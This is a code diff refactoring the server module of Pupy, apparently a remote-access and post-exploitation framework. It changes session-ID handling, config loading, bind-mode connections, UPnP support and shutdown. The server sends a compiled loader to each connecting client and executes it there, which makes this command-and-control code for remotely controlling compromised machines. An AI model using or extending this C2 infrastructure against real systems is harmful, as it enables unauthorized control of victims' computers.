@@ -21,74 +21,71 @@ import modules
 import logging
 from .PupyErrors import PupyModuleExit, PupyModuleError
 from .PupyJob import PupyJob
-from .PupyCmd import color_real
 from .PupyCategories import PupyCategories
+from .PupyConfig import PupyConfig
+from .PupyService import PupyBindService
 from network.conf import transports
+from network.lib.connection import PupyConnectionThread
 from pupylib.utils.rpyc_utils import obtain
 from .PupyTriggers import on_connect
 from network.lib.utils import parse_transports_args
 from network.lib.base_launcher import LauncherError
 from os import path
 from shutil import copyfile
+from itertools import count, ifilterfalse
 import marshal
 import network.conf
 import rpyc
 import shlex
-
-try:
-    import ConfigParser as configparser
-except ImportError:
-    import configparser
+import socket
+import errno
 from . import PupyClient
 import os.path
 
 class PupyServer(threading.Thread):
-    def __init__(self, transport, transport_kwargs, port=None, ipv6=None):
+    def __init__(self, transport, transport_kwargs, port=None, igd=None):
         super(PupyServer, self).__init__()
-        self.daemon=True
-        self.server=None
-        self.authenticator=None
-        self.clients=[]
-        self.jobs={}
-        self.jobs_id=1
-        self.clients_lock=threading.Lock()
-        self.current_id=1
-        self.config = configparser.ConfigParser()
-        if not path.exists('pupy.conf'):
-            copyfile(
-                path.join(
-                    path.dirname(__file__), '..', 'pupy.conf.default'
-                ),
-            'pupy.conf')
-        self.config.read("pupy.conf")
-        if port is None:
-            self.port=self.config.getint("pupyd", "port")
+        self.daemon = True
+        self.server = None
+        self.authenticator = None
+        self.clients = []
+        self.jobs = {}
+        self.jobs_id = 1
+        self.clients_lock = threading.Lock()
+        self._current_id = set()
+
+        self.config = PupyConfig()
+        self.port = port or self.config.getint('pupyd', 'port')
+        self.address = self.config.getip('pupyd', 'address') or ''
+        if self.address:
+            self.ipv6 = self.address.version == 6
         else:
-            self.port=port
-        if ipv6 is None:
-            self.ipv6=self.config.getboolean("pupyd", "ipv6")
-        else:
-            self.ipv6=ipv6
-        try:
-            self.address=self.config.get("pupyd", "address")
-            if self.ipv6 and not ":" in self.address:
-                logging.warning("ipv4 detected in pupy.conf, only binding on ipv4")
-                self.ipv6=False
-        except configparser.NoOptionError:
-            self.address=''
-        if not transport:
-            try:
-                self.transport=self.config.get("pupyd", "transport")
-                if ' ' in self.transport:
-                    self.transport, self.transport_kwargs = self.transport.split(' ', 1)
-            except configparser.NoOptionError:
-                self.transport='ssl'
-        else:
-            self.transport = transport
-        self.handler=None
-        self.handler_registered=threading.Event()
-        self.transport_kwargs=transport_kwargs
-        self.categories=PupyCategories(self)
+            self.ipv6 = self.config.getboolean('pupyd', 'ipv6')
+
+        transport_args = (
+            transport or self.config.get('pupyd', 'transport')
+        ).split(' ', 1)
+
+        self.transport = transport_args[0]
+        self.transport_kwargs = transport_args[1] if len(transport_args) > 1 else None
+
+        self.handler = None
+        self.handler_registered = threading.Event()
+        self.transport_kwargs = transport_kwargs
+        self.categories = PupyCategories(self)
+        self.igd = igd
+        self.finished = threading.Event()
+        self._cleanups = []
+        self._singles = {}
+
+    def create_id(self):
+        """ return first lowest unused session id """
+        new_id = next(ifilterfalse(self._current_id.__contains__, count(1)))
+        self._current_id.add(new_id)
+        return new_id
+
+    def free_id(self, id):
+        self._current_id.remove(int(id))
 
     def register_handler(self, instance):
         """ register the handler instance, typically a PupyCmd, and PupyWeb in the futur"""
@@ -97,7 +94,7 @@ class PupyServer(threading.Thread):
 
     def add_client(self, conn):
         pc=None
-        with open(path.join(path.dirname(__file__), 'PupyClientInitializer.py')) as initializer:
+        with open(path.join(self.config.root, 'pupylib', 'PupyClientInitializer.py')) as initializer:
             conn.execute(
                 'import marshal;exec marshal.loads({})'.format(
                     repr(marshal.dumps(compile(initializer.read(), '<loader>', 'exec')))
@@ -107,29 +104,32 @@ class PupyServer(threading.Thread):
         l=conn.namespace["get_uuid"]()
 
         with self.clients_lock:
+            client_id = self.create_id()
             client_info = {
-                "id": self.current_id,
+                "id": client_id,
                 "conn" : conn,
                 "address" : conn._conn._config['connid'].rsplit(':',1)[0],
                 "launcher" : conn.get_infos("launcher"),
                 "launcher_args" : obtain(conn.get_infos("launcher_args")),
                 "transport" : obtain(conn.get_infos("transport")),
                 "daemonize" : (True if obtain(conn.get_infos("daemonize")) else False),
+                "native": conn.get_infos("native"),
             }
             client_info.update(l)
             pc=PupyClient.PupyClient(client_info, self)
             self.clients.append(pc)
             if self.handler:
                 addr = conn.modules['pupy'].get_connect_back_host()
-                server_ip, server_port = addr.rsplit(':', 1)
                 try:
                     client_ip, client_port = conn._conn._config['connid'].rsplit(':', 1)
                 except:
                     client_ip, client_port = "0.0.0.0", 0 # TODO for bind payloads
 
-                self.handler.display_srvinfo("Session {} opened ({}:{} <- {}:{})".format(
-                    self.current_id, server_ip, server_port, client_ip, client_port))
-            self.current_id += 1
+                self.handler.display_srvinfo("Session {} opened ({}{}:{})".format(
+                    client_id,
+                    '{} <- '.format(addr) if not '0.0.0.0' in addr else '',
+                    client_ip, client_port)
+                )
         if pc:
             on_connect(pc)
 
@@ -139,6 +139,7 @@ class PupyServer(threading.Thread):
                 if c.conn is client:
                     if self.handler:
                         self.handler.display_srvinfo('Session {} closed'.format(self.clients[i].desc['id']))
+                        self.free_id(self.clients[i].desc['id'])
                     del self.clients[i]
                     break
 
@@ -269,12 +270,22 @@ class PupyServer(threading.Thread):
         except LauncherError as e:
             launcher.arg_parser.print_usage()
             return
-        stream=launcher.iterate().next()
-        self.handler.display_info("Connecting ...")
-        conn=rpyc.utils.factory.connect_stream(stream, PupyService.PupyBindService, {})
-        bgsrv=rpyc.BgServingThread(conn)
-        bgsrv.SLEEP_INTERVAL=0.001 # consume ressources but faster response ...
 
+        try:
+            stream=launcher.iterate().next()
+        except socket.error as e:
+            self.handler.display_error("Couldn't connect to pupy: {}".format(e))
+            return
+
+        self.handler.display_success("Connected. Starting session")
+        bgsrv=PupyConnectionThread(
+            self,
+            PupyBindService,
+            rpyc.Channel(stream),
+            config={
+                'connid': launcher.args.host
+            })
+        bgsrv.start()
 
     def run(self):
         self.handler_registered.wait()
@@ -297,7 +308,47 @@ class PupyServer(threading.Thread):
             logging.exception(e)
 
         try:
-            self.server = t.server(PupyService.PupyService, port = self.port, hostname=self.address, authenticator=authenticator, stream=t.stream, transport=t.server_transport, transport_kwargs=t.server_transport_kwargs, ipv6=self.ipv6)
+            self.server = t.server(
+                PupyService,
+                port=self.port, hostname=self.address,
+                authenticator=authenticator,
+                stream=t.stream,
+                transport=t.server_transport,
+                transport_kwargs=t.server_transport_kwargs,
+                pupy_srv=self,
+                ipv6=self.ipv6,
+                igd=self.igd
+            )
+
             self.server.start()
+        except socket.error as e:
+            if e.errno == errno.EACCES:
+                logging.error('Insufficient privileges to bind on port {}'.format(self.port))
+            else:
+                logging.exception(e)
         except Exception as e:
             logging.exception(e)
+        finally:
+            self.finished.set()
+
+    def register_cleanup(self, cleanup):
+        self._cleanups.append(cleanup)
+
+    def single(self, ctype, *args, **kwargs):
+        single = self._singles.get(ctype)
+        if not single:
+            single = ctype(*args, **kwargs)
+            self._singles[ctype] = single
+
+        return single
+
+    def stop(self):
+        for cleanup in self._cleanups:
+            cleanup()
+
+        self._cleanups = []
+
+        if self.server:
+            self.server.close()
+
+        self.finished.set()
